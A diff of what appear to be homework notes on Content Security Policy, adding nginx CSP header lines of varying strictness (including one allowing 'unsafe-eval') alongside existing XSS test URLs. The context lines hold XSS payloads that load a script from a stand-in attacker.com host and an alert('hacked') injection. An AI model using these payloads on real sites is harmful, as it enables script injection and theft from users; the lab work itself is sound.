@@ -21,6 +21,18 @@ sudo nano /var/www/html/info.php
 victim.com/csp.php?js=<script/src=//attacker.com/evil.js></script>
 attacker.com/csp.php?js=<script/src=//attacker.com/evil.js></script>
 
+add_header Content-Security-Policy "script-src 'none';";
+add_header Content-Security-Policy "script-src 'self';";
+
+
 ###
 http://victim.com/hw-6-3.php?name=<script>alert("hacked")</script>
+
+http://sub.victim.com
+add_header Content-Security-Policy "script-src http://victim.com;";
+add_header Content-Security-Policy "script-src http://victim.com http://sub.victim.com;";
+
+###
+add_header Content-Security-Policy "script-src 'unsafe-eval' http://victim.com http://partner.com http://home.victim.com;";
+http://victim.com/hw-6-4.html?text=123
 
